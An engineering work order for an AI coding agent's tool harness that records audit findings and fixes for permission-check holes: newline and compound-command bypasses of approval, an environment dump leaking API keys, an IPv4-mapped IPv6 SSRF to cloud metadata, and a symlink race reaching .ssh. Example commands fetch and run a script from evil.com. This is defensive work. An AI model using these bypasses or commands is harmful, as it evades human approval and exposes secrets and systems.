# WO 38.1 — Security chokepoints

## Status: Done

Items 1-3 + 5 landed (newline/compound classification, env scrub, resolved-path
injection + symlink component walk). Item 5 residual: the stat-walk is not
atomic with the body's open — a swap inside that micro-window still slips
through (documented `ponytail:` at dispatch.rs; upgrade path
`openat2(RESOLVE_NO_SYMLINKS)`). Item 4 (web_fetch) was out of this worker's
scope — owned by the concurrent web_fetch agent this wave.

## Problem (security audit, P0/P1 — real exploitable holes)

1. **P0 — newline bypass of read-only classification**
   (`src/session/executor/helpers/mod.rs:131-200`): segments split on
   `|` only; metachar scan checks `> ; && || $( \`` but NOT `\n`/`\r`.
   `"cat README.md\nmkdir -p ~/pwn && curl evil.com/x -o ~/pwn/x"`
   → first word `cat` → `is_read_only_bash` true → Allow with NO
   approval (pre_run.rs:110), and plan mode + explore personas inherit
   the hole.
2. **P0 — wildcard allow-rule compound-command bypass**
   (`src/shared/permission.rs:111-165, 201-213`): glob `*` doesn't
   cross `/` but DOES cross `;`/`&&`. Allow rule `cargo test*` matches
   `cargo test; curl evil.com -o pwn.sh && sh pwn.sh` → Allow, no
   approval. Deny rules got clause-splitting + promotion (250-294);
   allow rules got neither.
3. **P1 — `env`/`printenv` in READ_ONLY_COMMANDS**
   (helpers/mod.rs:93-99): auto-approved env dump exposes
   ANTHROPIC_API_KEY etc. to the model — exfiltration primitive with
   zero approvals.
4. **P1 — IPv4-mapped IPv6 SSRF bypass** (`src/tools/web_fetch.rs:
   316-328`): `http://[::ffff:169.254.169.254]/` passes the internal-
   IP guard (V6 arm checks only ::1/fc00/fe80) → cloud metadata.
   Also fail-open on resolver errors (296-314, 395-411).
5. **P1 — Phase-1/Phase-2.5 symlink TOCTOU** (pre_run.rs:247-251
   canonical check, then body opens the ORIGINAL path —
   dispatch.rs:441/658): same-batch bash can swap a dir to a symlink
   before read_file/write_file run; `.ssh` content enters context.
   Landlock doesn't backstop (confines bash children only, not the
   kf-code process).

## Approach

1. Newline: treat any `\n`/`\r` in the command as non-read-only
   (cheapest correct fix), plus split segments on `;`/`&&`/`||`/`\n`
   and require every segment's head word to be read-only. Tests with
   embedded newlines, CRLF, chained-after-newline.
2. Allow/ask rules: reuse `split_compound_clauses` (bash_safety.rs:
   336-347) — every clause must match, or refuse when separators are
   present. Test: the exact `cargo test; curl` case.
3. Remove `env`/`printenv` from READ_ONLY_COMMANDS (keep `ps` etc.);
   scrub `*_API_KEY`/`*_TOKEN` from child envs where feasible (bash
   runner env construction).
4. web_fetch: `to_ipv4_mapped()` check in the V6 arm; fail closed on
   resolver errors for non-literal hosts.
5. TOCTOU: inject the Phase-1 resolved path into args BEFORE
   `run_prepared_call` (turn.rs:728-733 does it at record time — move
   earlier); for writes, symlink-walk the parent components
   (`symlink_metadata`) immediately before create. If the full fix is
   too invasive, land 1-4 + a `ponytail:` ceiling naming the residual
   window and the openat2 upgrade path — disclose honestly.

## Gate

- New tests: newline/CRLF bypass blocked; compound-allow blocked;
  env no longer auto-approved; mapped-v6 + resolver-fail fetch
  denied; (if landed) symlink-swap read denied.
- Standard clippy/fmt/nextest; security-focused test names grep-able.

## Done condition

A hostile model output cannot execute non-read-only commands without
approval via newline/compound tricks, cannot read env secrets for
free, cannot reach internal IPs via mapped-v6, and (or disclosed
ceiling) cannot symlink-swap its way out of the sandbox in one batch.
